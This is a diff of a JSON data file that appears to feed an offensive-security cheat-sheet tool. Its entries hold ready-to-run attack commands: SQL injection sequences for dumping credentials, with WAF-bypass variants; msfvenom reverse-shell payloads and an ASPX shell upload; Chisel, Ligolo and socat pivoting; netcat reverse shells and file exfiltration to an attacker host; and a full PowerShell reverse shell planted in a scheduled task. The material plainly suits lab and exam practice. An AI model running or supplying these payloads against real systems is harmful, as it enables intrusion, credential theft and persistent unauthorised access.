@@ -4966,7 +5072,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "sqlmap -u 'http://<TARGET_IP>/page?id=1' --batch --dbs\nsqlmap -u 'http://<TARGET_IP>/page?id=1' -p id --batch --dump\nsqlmap -r req.txt -p <PARAM> --batch --dump --random-agent",
+      "command": "# ใช้กับ URL ตรง เมื่อรู้ parameter ที่ injectable.\nsqlmap -u 'http://<TARGET_IP>/page?id=1' --batch --dbs\nsqlmap -u 'http://<TARGET_IP>/page?id=1' -p id --batch --dump\n\n# ใช้ request จาก Burp เมื่อมี cookie/header/body สำคัญ.\nsqlmap -r req.txt -p <PARAM> --batch --dump --random-agent",
       "lang": "sh"
     },
     {
@@ -4995,7 +5101,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "-- 1. หา column count.\n' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n\n-- 2. ยืนยันจำนวน column.\n' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL-- -\n\n-- 3. หา column ที่แสดงผลบนหน้า.\n' UNION SELECT 'FUZZ',NULL,NULL-- -\n' UNION SELECT NULL,'FUZZ',NULL-- -\n' UNION SELECT NULL,NULL,'FUZZ'-- -\n\n-- 4. Fingerprint DB.\n' UNION SELECT NULL,@@version,NULL-- -\n' UNION SELECT NULL,version(),NULL-- -\n\n-- 5. Dump credentials.\n' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users-- -",
+      "command": "-- 1. หา column count: เพิ่มเลขไปเรื่อยๆ จน response error/เปลี่ยน.\n-- เลขก่อนหน้าที่ยังปกติคือจำนวน column ที่ต้องใช้กับ UNION.\n' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n\n-- 2. ยืนยันจำนวน column: UNION ต้องมีจำนวน column เท่ากับ query เดิม.\n-- ถ้าหน้าเว็บไม่ error แปลว่าจำนวน NULL ถูกแล้ว.\n' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL-- -\n\n-- 3. หา output column: ใส่ FUZZ ทีละตำแหน่งแล้วดูว่าคำไหนโผล่บนหน้าเว็บ.\n-- column ที่เห็น output ได้คือจุดที่จะใช้ fingerprint หรือ dump ข้อมูล.\n' UNION SELECT 'FUZZ',NULL,NULL-- -\n' UNION SELECT NULL,'FUZZ',NULL-- -\n' UNION SELECT NULL,NULL,'FUZZ'-- -\n\n-- 4. Fingerprint DB: รู้ engine เพื่อเลือกชุด enum ถัดไป เช่น MySQL/MSSQL/PostgreSQL.\n-- ถ้ารู้แล้วให้ไปใช้ section enum ของ DB นั้น หรือเลือก payload file read/write/RCE ที่ตรง engine.\n' UNION SELECT NULL,@@version,NULL-- -\n' UNION SELECT NULL,version(),NULL-- -\n\n-- 5. Dump credentials ผ่าน column ที่แสดงผลได้.\n-- ถ้าไม่ออก ให้เช็คชื่อ table/column ก่อน หรือเปลี่ยนตำแหน่ง output column.\n-- เจอ hash ไป crack, เจอ plaintext ค่อยลอง credential reuse.\n' UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users-- -",
       "lang": "sql"
     },
     {
@@ -5024,11 +5130,11 @@
         "Shell"
       ],
       "next": [],
-      "command": "SeLeCt\nUN/**/ION SEL/**/ECT\n/*!50000SELECT*/\nUNION%0aSELECT%0aNULL,version(),NULL-- -\nUNION%20SELECT%20NULL,user(),NULL-- -",
+      "command": "-- ลองทีละแบบใน Repeater ถ้า WAF block keyword/pattern ปกติ.\nSeLeCt\nUN/**/ION SEL/**/ECT\n/*!50000SELECT*/\nUNION%0aSELECT%0aNULL,version(),NULL-- -\nUNION%20SELECT%20NULL,user(),NULL-- -",
       "lang": "sql"
     },
     {
-      "id": "note-exploitation-web-payloads-md-16",
+      "id": "note-exploitation-web-payloads-md-17",
       "title": "WiFi Mouse 1.7.8.5 RCE",
       "description": "Exploit WiFi Mouse 1.7.8.5 after confirming the service, then deliver a Windows payload.",
       "source": "Exploitation/Web Payloads.md",
@@ -5713,7 +5819,7 @@
         "Shell"
       ],
       "next": [],
-      "command": "# Windows EXE / DLL / MSI.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/xor_dynamic -f exe -o shell_en.exe\nmsfvenom -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe\nmsfvenom -p windows/adduser USER=<USER> PASS=<PASS> -f exe -o useradd.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o installer.msi\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o metershell.exe\n\n# Linux ELF.\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf\nmsfvenom -p linux/x64/shell_bind_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell_bind.elf\n\n# Web payloads.\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o metershell.asp\nmsfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php\n\n# Unix command payloads.\nmsfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.py\nmsfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.sh\nmsfvenom -p cmd/unix/reverse_perl LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.pl\n\n# Discovery helpers.\nmsfvenom -l payloads\nmsfvenom -p <PAYLOAD> --list-options",
+      "command": "# Windows EXE / DLL / MSI.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/xor_dynamic -f exe -o shell_en.exe\nmsfvenom -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe\nmsfvenom -p windows/adduser USER=<USER> PASS=<PASS> -f exe -o useradd.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o installer.msi\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o metershell.exe\n\n# Linux ELF.\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf\nmsfvenom -p linux/x64/shell_bind_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell_bind.elf\n\n# Web payloads.\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o metershell.asp\nmsfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -f aspx -o shell.aspx\nmsfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php\n\n# Upload ASPX shell when the web root or upload path accepts PUT/WebDAV.\ncurl -T shell.aspx 'http://<TARGET_IP>/<UPLOAD_PATH>/shell.aspx' -u '<USER>:<PASS>'\n\n# Unix command payloads.\nmsfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.py\nmsfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.sh\nmsfvenom -p cmd/unix/reverse_perl LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.pl\n\n# Discovery helpers.\nmsfvenom -l payloads\nmsfvenom -p <PAYLOAD> --list-options",
       "lang": "sh"
     },
     {
@@ -5798,9 +5904,9 @@
       "lang": "sh"
     },
     {
-      "id": "note-pivoting-tunnelling-md-2",
+      "id": "note-pivoting-tunnelling-md-4",
       "title": "Chisel Reverse Port Forward",
-      "description": "Expose a Windows-only local service such as `127.0.0.1:3306` back to the attacker box.",
+      "description": "Expose target-local services such as `127.0.0.1:1433`, `127.0.0.1:3306`, or `127.0.0.1:5000` back to the attacker box. No admin is required, so this is a strong Windows fallback.",
       "source": "Pivoting/Tunnelling.md",
       "source_type": "markdown",
       "tab": "Pivoting",
@@ -5825,11 +5931,11 @@
         "Pivot"
       ],
       "next": [],
-      "command": "# 1. Start the reverse server on Kali.\n\nchisel server -p <LPORT> --reverse\n\n# 2. Download and run the Windows client on the target.\n\niwr -Uri http://<LHOST>/chisel.exe -OutFile chisel.exe\n.\\chisel.exe client <LHOST>:<LPORT> R:3306:127.0.0.1:3306\n\n# 3. Connect to the forwarded service from Kali.\n\nmysql -u root -h 127.0.0.1 --skip-ssl",
+      "command": "# 1. Start the reverse server on Kali.\n\nchisel server -p <LPORT> --reverse\n\n# 2. Download and run the Windows client on the target.\n\niwr -Uri http://<LHOST>/chisel.exe -OutFile chisel.exe\n.\\chisel.exe client <LHOST>:<LPORT> R:3306:127.0.0.1:3306\n\n# 3. Connect to the forwarded service from Kali.\n\nmysql -u root -h 127.0.0.1 --skip-ssl\n\n# 4. Example: forward target-local MSSQL to Kali.\n\nnetstat -ano\n# Found: 127.0.0.1:1433 LISTENING\n\n# Attacker: start Chisel reverse server.\nchisel server -p 8000 --reverse\n\n# Target: forward local MSSQL back to the attacker.\nchisel.exe client <LHOST>:8000 R:1433:127.0.0.1:1433\n\n# Attacker: connect to the forwarded MSSQL listener.\nimpacket-mssqlclient <USER>:<PASS>@127.0.0.1 -port 1433\n\n# 5. Example: forward a target-local web service to Kali.\n\n# Found: 127.0.0.1:5000 LISTENING\n\n# Target: forward local web service back to attacker port 9000.\nchisel.exe client <LHOST>:8000 R:9000:127.0.0.1:5000\n\n# Attacker: browse or curl the forwarded service.\ncurl http://127.0.0.1:9000",
       "lang": ""
     },
     {
-      "id": "note-pivoting-tunnelling-md-3",
+      "id": "note-pivoting-tunnelling-md-2",
       "title": "Chisel Reverse SOCKS",
       "description": "Expose a reverse SOCKS proxy through a Windows foothold.",
       "source": "Pivoting/Tunnelling.md",
@@ -5860,7 +5966,40 @@
       "lang": ""
     },
     {
-      "id": "note-pivoting-tunnelling-md-5",
+      "id": "note-pivoting-tunnelling-md-7",
+      "title": "Ligolo-ng Localhost Forward",
+      "description": "Use this when Ligolo is already connected and started. If not, set up the routed pivot first: [Ligolo-ng Pivot](#view=notes&note=note-pivoting-tunnelling-md&section=note-pivoting-tunnelling-md-tunnelling-pivot-ligolo-ng-pivot).",
+      "source": "Pivoting/Tunnelling.md",
+      "source_type": "markdown",
+      "tab": "Pivoting",
+      "tags": [
+        "Shell",
+        "Windows",
+        "Linux",
+        "Pivoting",
+        "Tunnelling"
+      ],
+      "requires": [
+        "Shell"
+      ],
+      "services": [],
+      "attack_types": [
+        "Pivoting",
+        "Tunnelling"
+      ],
+      "target_types": [
+        "Windows",
+        "Linux"
+      ],
+      "outputs": [
+        "Pivot"
+      ],
+      "next": [],
+      "command": "# After Ligolo tunnel is started.\nstart\n\n# Found: 127.0.0.1:1433 (MSSQL)\n\n# Ligolo console: forward target localhost -> attacker listener.\nlistener_add --addr 0.0.0.0:1433 --to 127.0.0.1:1433\n\n# Result: attacker:1433 -> target:127.0.0.1:1433\n\n# Attacker: connect to the forwarded MSSQL listener.\nimpacket-mssqlclient <USER>:<PASS>@127.0.0.1 -port 1433",
+      "lang": "sh"
+    },
+    {
+      "id": "note-pivoting-tunnelling-md-3",
       "title": "Ligolo-ng Pivot",
       "description": "Use Ligolo-ng when you have code execution on a pivot host and need routed access to an internal subnet.",
       "source": "Pivoting/Tunnelling.md",
@@ -5921,7 +6060,7 @@
       "lang": "sh"
     },
     {
-      "id": "note-pivoting-tunnelling-md-4",
+      "id": "note-pivoting-tunnelling-md-6",
       "title": "Socat",
       "description": "Use Socat for stable reverse shells, simple port forwards, or raw file transfers.",
       "source": "Pivoting/Tunnelling.md",
@@ -5948,7 +6087,38 @@
         "Pivot"
       ],
       "next": [],
-      "command": "# Stable reverse shell listener on attacker.\nsocat file:`tty`,raw,echo=0 tcp-listen:<LPORT>\n\n# Victim reverse shell.\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>\n\n# Port forward local listener to an internal service.\nsocat tcp-listen:8080,fork tcp:<INTERNAL_HOST>:80\n\n# File transfer receiver and sender.\nsocat tcp-listen:<LPORT> open:received_file,creat\nsocat tcp-connect:<LHOST>:<LPORT> file:<FILE>",
+      "command": "# Stable reverse shell listener on attacker.\nsocat file:`tty`,raw,echo=0 tcp-listen:<LPORT>\n\n# Victim reverse shell.\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>\n\n# Port forward local listener to an internal service.\nsocat tcp-listen:8080,fork tcp:<INTERNAL_HOST>:80\n\n# Found: 127.0.0.1:3306\n# Target: expose target-local MySQL through target port 3306.\nsocat TCP-LISTEN:3306,fork TCP:127.0.0.1:3306\n\n# Attacker: connect to the forwarded MySQL service.\nmysql -h <TARGET_IP> -P 3306 -u root -p\n\n# Found: 127.0.0.1:8080\n# Target: expose target-local web service through target port 8888.\nsocat TCP-LISTEN:8888,fork TCP:127.0.0.1:8080\n\n# Attacker: browse or curl the forwarded service.\ncurl http://<TARGET_IP>:8888\n\n# File transfer receiver and sender.\nsocat tcp-listen:<LPORT> open:received_file,creat\nsocat tcp-connect:<LHOST>:<LPORT> file:<FILE>",
+      "lang": "sh"
+    },
+    {
+      "id": "note-pivoting-tunnelling-md-5",
+      "title": "SSH Local / Remote Forward",
+      "description": "Use SSH forwarding when SSH credentials are available. Local forward is the cleanest path for services reachable from the target; remote forward helps when the service should be exposed back to Kali.",
+      "source": "Pivoting/Tunnelling.md",
+      "source_type": "markdown",
+      "tab": "Pivoting",
+      "tags": [
+        "Shell",
+        "Linux",
+        "Pivoting",
+        "Tunnelling"
+      ],
+      "requires": [
+        "Shell"
+      ],
+      "services": [],
+      "attack_types": [
+        "Pivoting",
+        "Tunnelling"
+      ],
+      "target_types": [
+        "Linux"
+      ],
+      "outputs": [
+        "Pivot"
+      ],
+      "next": [],
+      "command": "# Target or shell: find local-only listeners.\nss -tulnp\nnetstat -ano\n\n# Found: 127.0.0.1:1433\n# Attacker: local forward target MSSQL to Kali localhost.\nssh -L 1433:127.0.0.1:1433 <USER>@<TARGET_IP>\n\n# Attacker: connect to forwarded MSSQL.\nimpacket-mssqlclient <USER>:<PASS>@127.0.0.1 -port 1433\n\n# Found: 127.0.0.1:8080\n# Attacker: local forward target web service to Kali localhost.\nssh -L 8080:127.0.0.1:8080 <USER>@<TARGET_IP>\n\n# Attacker: browse or curl the forwarded service.\ncurl http://127.0.0.1:8080\n\n# Found: 127.0.0.1:3306 (MySQL)\n# Target: remote forward target MySQL back to Kali.\nssh -R 3306:127.0.0.1:3306 <USER>@<LHOST>\n\n# Attacker: connect from Kali.\nmysql -h 127.0.0.1 -P 3306",
       "lang": "sh"
     },
     {
@@ -5981,103 +6151,6 @@
       ],
       "next": [],
       "command": "sudo /etc/init.d/ssh start",
-      "lang": "sh"
-    },
-    {
-      "id": "note-post-exploitation-persistence-md-7",
-      "title": "Active Directory Domain Admin User",
-      "description": "Add user to Domain Admins when you already have sufficient privileges.",
-      "source": "Post-Exploitation/Persistence.md",
-      "source_type": "markdown",
-      "tab": "Post-Exploitation",
-      "tags": [
-        "Shell",
-        "ActiveDirectory",
-        "Persistence"
-      ],
-      "requires": [
-        "Shell"
-      ],
-      "services": [
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Persistence"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Persistence"
-      ],
-      "next": [],
-      "command": "net group \"Domain Admins\" <USER> /add /domain",
-      "lang": "cmd"
-    },
-    {
-      "id": "note-post-exploitation-persistence-md-9",
-      "title": "Active Directory Silver Ticket With Mimikatz",
-      "description": "Create and inject a Kerberos service ticket with Mimikatz.",
-      "source": "Post-Exploitation/Persistence.md",
-      "source_type": "markdown",
-      "tab": "Post-Exploitation",
-      "tags": [
-        "Hash",
-        "Kerberos",
-        "ActiveDirectory",
-        "Persistence"
-      ],
-      "requires": [
-        "Hash"
-      ],
-      "services": [
-        "Kerberos",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Persistence"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Persistence"
-      ],
-      "next": [],
-      "command": "mimikatz \"kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /target:<TARGET_SERVER> /service:<TARGET_SERVICE> /aes256:<COMPUTER_AES256_KEY> /user:<ANY_USER> /ptt\"",
-      "lang": "powershell"
-    },
-    {
-      "id": "note-post-exploitation-persistence-md-8",
-      "title": "Active Directory Silver Ticket With Ticketer",
-      "description": "Create a silver ticket.",
-      "source": "Post-Exploitation/Persistence.md",
-      "source_type": "markdown",
-      "tab": "Post-Exploitation",
-      "tags": [
-        "Hash",
-        "Kerberos",
-        "ActiveDirectory",
-        "Persistence"
-      ],
-      "requires": [
-        "Hash"
-      ],
-      "services": [
-        "Kerberos",
-        "ActiveDirectory"
-      ],
-      "attack_types": [
-        "Persistence"
-      ],
-      "target_types": [
-        "ActiveDirectory"
-      ],
-      "outputs": [
-        "Persistence"
-      ],
-      "next": [],
-      "command": "ticketer.py -nthash <MACHINE_NT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <ANY_USER>",
       "lang": "sh"
     },
     {
@@ -6491,10 +6564,10 @@
       "lang": "powershell"
     },
     {
-      "id": "note-post-exploitation-file-transfer-md-1",
-      "title": "Linux",
+      "id": "note-post-exploitation-linux-file-transfer-md-1",
+      "title": "HTTP / SSH Copy",
       "description": "Quick Linux file download and copy reference.",
-      "source": "Post-Exploitation/File Transfer.md",
+      "source": "Post-Exploitation/Linux File Transfer.md",
       "source_type": "markdown",
       "tab": "Post-Exploitation",
       "tags": [
@@ -6520,10 +6593,10 @@
       "lang": "sh"
     },
     {
-      "id": "note-post-exploitation-persistence-md-1",
+      "id": "note-post-exploitation-linux-persistence-md-1",
       "title": "Linux Crontab Check",
       "description": "Check if crontab exists.",
-      "source": "Post-Exploitation/Persistence.md",
+      "source": "Post-Exploitation/Linux Persistence.md",
       "source_type": "markdown",
       "tab": "Post-Exploitation",
       "tags": [
@@ -6549,10 +6622,10 @@
       "lang": "sh"
     },
     {
-      "id": "note-post-exploitation-persistence-md-2",
+      "id": "note-post-exploitation-linux-persistence-md-2",
       "title": "Linux Crontab Edit",
       "description": "Edit current user's crontab.",
-      "source": "Post-Exploitation/Persistence.md",
+      "source": "Post-Exploitation/Linux Persistence.md",
       "source_type": "markdown",
       "tab": "Post-Exploitation",
       "tags": [
@@ -6578,10 +6651,10 @@
       "lang": "sh"
     },
     {
-      "id": "note-post-exploitation-persistence-md-3",
+      "id": "note-post-exploitation-linux-persistence-md-3",
       "title": "Linux Reverse Shell Cron",
       "description": "Append reverse shell cron entry without interactive editor.",
-      "source": "Post-Exploitation/Persistence.md",
+      "source": "Post-Exploitation/Linux Persistence.md",
       "source_type": "markdown",
       "tab": "Post-Exploitation",
       "tags": [
@@ -6641,16 +6714,15 @@
       "lang": "powershell"
     },
     {
-      "id": "note-post-exploitation-file-transfer-md-3",
+      "id": "note-post-exploitation-windows-file-transfer-md-2",
       "title": "Netcat",
-      "description": "Transfer a file over Netcat or use Windows `nc.exe`/`ncat.exe` for shells and file movement.",
-      "source": "Post-Exploitation/File Transfer.md",
+      "description": "Use Windows `nc.exe`/`ncat.exe` for shells and file movement.",
+      "source": "Post-Exploitation/Windows File Transfer.md",
       "source_type": "markdown",
       "tab": "Post-Exploitation",
       "tags": [
         "Shell",
         "PostExploit",
-        "Linux",
         "Windows"
       ],
       "requires": [
@@ -6661,15 +6733,72 @@
         "PostExploit"
       ],
       "target_types": [
-        "Linux",
         "Windows"
       ],
       "outputs": [
         "Files"
       ],
       "next": [],
-      "command": "# Option 1: simple listener / sender pair.\nnc -lvp <LPORT> < <FILE>\nnc <LHOST> <LPORT> > <FILE>\n\n# Option 2: explicit listener then send the file.\nnc -q 0 -lvp 443 > file\nnc -nv <LHOST> 443 < file\n\n# Windows reverse shell with nc.exe.\nnc.exe -nv <LHOST> <LPORT> -e cmd.exe\nnc.exe -nv <LHOST> <LPORT> -e powershell.exe\n\n# Windows file transfer.\nnc.exe -lvnp <LPORT> > received_file.exe\nnc.exe <LHOST> <LPORT> < file_to_send.exe",
-      "lang": "sh"
+      "command": "# Windows reverse shell with nc.exe.\nnc.exe -nv <LHOST> <LPORT> -e cmd.exe\nnc.exe -nv <LHOST> <LPORT> -e powershell.exe\n\n# Windows file transfer.\nnc.exe -lvnp <LPORT> > received_file.exe\nnc.exe <LHOST> <LPORT> < file_to_send.exe",
+      "lang": "cmd"
+    },
+    {
+      "id": "note-post-exploitation-linux-file-transfer-md-2",
+      "title": "Netcat Pull Target File",
+      "description": "Pull a file from the target back to the attacker over Netcat.",
+      "source": "Post-Exploitation/Linux File Transfer.md",
+      "source_type": "markdown",
+      "tab": "Post-Exploitation",
+      "tags": [
+        "Shell",
+        "PostExploit",
+        "Linux"
+      ],
+      "requires": [
+        "Shell"
+      ],
+      "services": [],
+      "attack_types": [
+        "PostExploit"
+      ],
+      "target_types": [
+        "Linux"
+      ],
+      "outputs": [
+        "Files"
+      ],
+      "next": [],
+      "command": "# 1. Prepare a sample file on the target if needed.\n\necho \"password\" > secret.txt\n\n# 2. Start the receiver on the attacker box.\n\nnc -lvnp <LPORT> > dump.txt\n\n# 3. Send the file from the target.\n\nnc <LHOST> <LPORT> < secret.txt",
+      "lang": ""
+    },
+    {
+      "id": "note-post-exploitation-linux-file-transfer-md-3",
+      "title": "Netcat Push Attacker File",
+      "description": "Push a file from the attacker to the target over Netcat.",
+      "source": "Post-Exploitation/Linux File Transfer.md",
+      "source_type": "markdown",
+      "tab": "Post-Exploitation",
+      "tags": [
+        "Shell",
+        "PostExploit",
+        "Linux"
+      ],
+      "requires": [
+        "Shell"
+      ],
+      "services": [],
+      "attack_types": [
+        "PostExploit"
+      ],
+      "target_types": [
+        "Linux"
+      ],
+      "outputs": [
+        "Files"
+      ],
+      "next": [],
+      "command": "# 1. Prepare the file on the attacker box.\n\necho \"Payload\" > shell.txt\n\n# 2. Start the receiver on the target.\n\nnc -lvnp <LPORT> > exploit.txt\n\n# 3. Send the file from the attacker box.\n\nnc <TARGET_IP> <LPORT> < shell.txt",
+      "lang": ""
     },
     {
       "id": "note-post-exploitation-full-interactive-shell-md-3",
@@ -6830,64 +6959,6 @@
       "lang": ""
     },
     {
-      "id": "note-post-exploitation-file-transfer-md-5",
-      "title": "Send Attacker File To Target",
-      "description": "Push a file from the attacker to the target over Netcat.",
-      "source": "Post-Exploitation/File Transfer.md",
-      "source_type": "markdown",
-      "tab": "Post-Exploitation",
-      "tags": [
-        "Shell",
-        "PostExploit",
-        "Linux"
-      ],
-      "requires": [
-        "Shell"
-      ],
-      "services": [],
-      "attack_types": [
-        "PostExploit"
-      ],
-      "target_types": [
-        "Linux"
-      ],
-      "outputs": [
-        "Files"
-      ],
-      "next": [],
-      "command": "# 1. Prepare the file on the attacker box.\n\necho \"Payload\" > shell.txt\n\n# 2. Start the receiver on the target.\n\nnc -lvnp <LPORT> > exploit.txt\n\n# 3. Send the file from the attacker box.\n\nnc <TARGET_IP> <LPORT> < shell.txt",
-      "lang": ""
-    },
-    {
-      "id": "note-post-exploitation-file-transfer-md-4",
-      "title": "Send Target File To Attacker",
-      "description": "Pull a file from the target back to the attacker over Netcat.",
-      "source": "Post-Exploitation/File Transfer.md",
-      "source_type": "markdown",
-      "tab": "Post-Exploitation",
-      "tags": [
-        "Shell",
-        "PostExploit",
-        "Linux"
-      ],
-      "requires": [
-        "Shell"
-      ],
-      "services": [],
-      "attack_types": [
-        "PostExploit"
-      ],
-      "target_types": [
-        "Linux"
-      ],
-      "outputs": [
-        "Files"
-      ],
-      "next": [],
-      "command": "# 1. Prepare a sample file on the target if needed.\n\necho \"password\" > secret.txt\n\n# 2. Start the receiver on the attacker box.\n\nnc -lvnp <LPORT> > dump.txt\n\n# 3. Send the file from the target.\n\nnc <LHOST> <LPORT> < secret.txt",
-      "lang": ""
-    },
-    {
       "id": "note-post-exploitation-windows-post-exploitation-md-3",
       "title": "Sessions",
       "description": "Check who is logged on and which interactive/network sessions are active.",
@@ -6922,10 +6993,10 @@
       "lang": "cmd"
     },
     {
-      "id": "note-post-exploitation-file-transfer-md-6",
-      "title": "SMB",
+      "id": "note-post-exploitation-windows-file-transfer-md-3",
+      "title": "SMB Share Copy",
       "description": "Host an SMB share and copy files to or from it.",
-      "source": "Post-Exploitation/File Transfer.md",
+      "source": "Post-Exploitation/Windows File Transfer.md",
       "source_type": "markdown",
       "tab": "Post-Exploitation",
       "tags": [
@@ -7049,10 +7120,10 @@
       "lang": "cmd"
     },
     {
-      "id": "note-post-exploitation-persistence-md-5",
+      "id": "note-post-exploitation-windows-persistence-md-2",
       "title": "Windows Enable RDP",
       "description": "Enable RDP with NetExec when you have local admin credentials.",
-      "source": "Post-Exploitation/Persistence.md",
+      "source": "Post-Exploitation/Windows Persistence.md",
       "source_type": "markdown",
       "tab": "Post-Exploitation",
       "tags": [
@@ -7083,10 +7154,10 @@
       "lang": "sh"
     },
     {
-      "id": "note-post-exploitation-persistence-md-6",
+      "id": "note-post-exploitation-windows-persistence-md-3",
       "title": "Windows Execution Policy Bypass",
       "description": "Set PowerShell execution policy to bypass on the machine.",
-      "source": "Post-Exploitation/Persistence.md",
+      "source": "Post-Exploitation/Windows Persistence.md",
       "source_type": "markdown",
       "tab": "Post-Exploitation",
       "tags": [
@@ -7112,10 +7183,10 @@
       "lang": "powershell"
     },
     {
-      "id": "note-post-exploitation-file-transfer-md-2",
+      "id": "note-post-exploitation-windows-file-transfer-md-1",
       "title": "Windows HTTP",
       "description": "Quick Windows HTTP download reference.",
-      "source": "Post-Exploitation/File Transfer.md",
+      "source": "Post-Exploitation/Windows File Transfer.md",
       "source_type": "markdown",
       "tab": "Post-Exploitation",
       "tags": [
@@ -7141,10 +7212,10 @@
       "lang": "powershell"
     },
     {
-      "id": "note-post-exploitation-persistence-md-4",
+      "id": "note-post-exploitation-windows-persistence-md-1",
       "title": "Windows Local Admin User",
       "description": "Create a local admin user and grant remote access groups.",
-      "source": "Post-Exploitation/Persistence.md",
+      "source": "Post-Exploitation/Windows Persistence.md",
       "source_type": "markdown",
       "tab": "Post-Exploitation",
       "tags": [
@@ -7946,7 +8017,7 @@
       "lang": ""
     },
     {
-      "id": "note-privilege-escalation-windows-privilege-escalation-md-21",
+      "id": "note-privilege-escalation-windows-privilege-escalation-md-22",
       "title": "PrintSpoofer",
       "description": "Abuse `SeImpersonatePrivilege` with PrintSpoofer to spawn a privileged shell or callback.",
       "source": "Privilege Escalation/Windows Privilege Escalation.md",
@@ -8080,7 +8151,7 @@
       "lang": "powershell"
     },
     {
-      "id": "note-privilege-escalation-windows-privilege-escalation-md-22",
+      "id": "note-privilege-escalation-windows-privilege-escalation-md-23",
       "title": "Remote Execution After Admin",
       "description": "Use psexec after obtaining local admin credentials.",
       "source": "Privilege Escalation/Windows Privilege Escalation.md",
@@ -8209,6 +8280,37 @@
       "next": [],
       "command": "# 1. Find non-Microsoft scheduled tasks.\n\nGet-ScheduledTask | Where-Object { $_.TaskPath -notlike '\\Microsoft\\*' }\n\n# 2. Inspect the interesting task and script permission.\n\nschtasks /query /tn \"VulnerableTask\" /v /fo list\nicacls C:\\Users\\Public\\TaskScript\\taskscript.ps1\n\n# 3. Replace `taskscript.ps1` with this PowerShell reverse shell body.\n\n# --- file powershell ---\n\n$LHOST = \"<LHOST>\"\n$LPORT = <LPORT>\n$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)\n$NetworkStream = $TCPClient.GetStream()\n$StreamReader = New-Object IO.StreamReader($NetworkStream)\n$StreamWriter = New-Object IO.StreamWriter($NetworkStream)\n$StreamWriter.AutoFlush = $true\n$Buffer = New-Object System.Byte[] 1024\nwhile ($TCPClient.Connected) {\n  while ($NetworkStream.DataAvailable) {\n    $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)\n    $Code = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $RawData - 1)\n  }\n  if ($TCPClient.Connected -and $Code.Length -gt 1) {\n    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }\n    $StreamWriter.Write(\"$Output`n\")\n    $Code = $null\n  }\n}\n$TCPClient.Close()\n$NetworkStream.Close()\n$StreamReader.Close()\n$StreamWriter.Close()\n\n# --- end file powershell ---\n\n# 4. Catch the scheduled callback.\n\nnc -lvnp <LPORT>",
       "lang": ""
+    },
+    {
+      "id": "note-privilege-escalation-windows-privilege-escalation-md-20",
